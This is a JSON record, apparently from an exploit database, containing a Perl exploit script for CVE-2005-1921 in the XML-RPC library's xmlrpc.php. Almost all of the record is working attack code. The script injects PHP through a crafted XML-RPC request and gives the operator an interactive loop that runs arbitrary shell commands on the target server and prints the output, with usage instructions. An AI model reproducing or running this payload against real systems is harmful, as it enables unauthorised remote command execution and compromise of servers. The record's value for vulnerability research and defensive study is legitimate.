{
  "id": "1083",
  "title": "XML-RPC Library 1.3.0 - &#039;xmlrpc.php&#039; Remote Command Execution (2)",
  "cve": "CVE-2005-1921",
  "vuln_type": "unknown",
  "code": "#-------------------------------------------------------#\r\n#                     /|                                #       \r\n#                    | |                                #      \r\n#                    | |                                #      \r\n#       /\\   ________| |___                             #       \r\n#      /  \\  \\_______   __/                             #\r\n#     /    \\|\\_____  | | _       _  _     _  ()___      #      \r\n#    /  /\\  \\  ___ \\ | |<_>  /  |  |  | || \\ || | | |   #       \r\n#   /  /__\\  \\|   \\ || | _  /__ |_ |  | ||_/ || | |_|   #       \r\n#  /  ______  \\   | || || |   / |  |  | || \\ || |   |   #       \r\n# /  /      \\  \\  | || || |  /  |_ |_ |_||  \\|| | \\_|   #       \r\n# \\_/       |\\_/  | || || | ___ _  _                    #       \r\n#           | |   | || /| |  | |  | ||\\/|               #       \r\n#            \\|    \\||/  \\|  | |_ |_||  |               #       \r\n#                            | |  | ||  |               #       \r\n#                            | |_ | ||  |               #       \r\n#                                                       #\r\n#         Original advisory by http://gulftech.org/     #\r\n#         Exploit coded by dukenn (http://asteam.org)   #\r\n#                                                       # \r\n#-------------------------------------------------------\r\n\r\n#!/usr/bin/perl\r\n\r\nuse IO::Socket;\r\n\r\nprint \"XMLRPC remote commands execute exploit by dukenn (http://asteam.org)\\n\";\r\n\r\nif ($ARGV[0] && $ARGV[1])\r\n{\r\n $host = $ARGV[0];\r\n $xml = $ARGV[1];\r\n $sock = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$host\", PeerPort => \"80\") || die \"connecterror\\n\";\r\n while (1) {\r\n    print '['.$host.']# ';\r\n    $cmd = <STDIN>;\r\n    chop($cmd);\r\n    last if ($cmd eq 'exit');\r\n    $xmldata = \"<?xml version=\\\"1.0\\\"?><methodCall><methodName>test.method</methodName><params><param><value><name>',''));echo '_begin_\\n';echo `\".$cmd.\"`;echo '_end_';exit;/*</name></value></param></params></methodCall>\";\r\n    print $sock \"POST \".$xml.\" HTTP/1.1\\n\";\r\n    print $sock \"Host: \".$host.\"\\n\";\r\n    print $sock \"Content-Type: text/xml\\n\";\r\n    print $sock \"Content-Length:\".length($xmldata).\"\\n\\n\".$xmldata;\r\n    $good=0;\r\n    while ($ans = <$sock>)\r\n       {\r\n        if ($good == 1) { print \"$ans\"; }\r\n        last if ($ans =~ /^_end_/);\r\n        if ($ans =~ /^_begin_/) { $good = 1; }\r\n       }\r\n      if ($good==0) {print \"Exploit Failed\\n\";exit();}\r\n   }\r\n }\r\nelse {\r\n print \"Usage: perl xml.pl [host] [path_to_xmlrpc]\\n\\n\";\r\n print \"Example: perl xml.pl target.com /script/xmlrpc.php\\n\";\r\nexit;\r\n}\r\n\r\n# milw0rm.com [2005-07-04]",
  "url": "https://www.exploit-db.com/exploits/1083"
}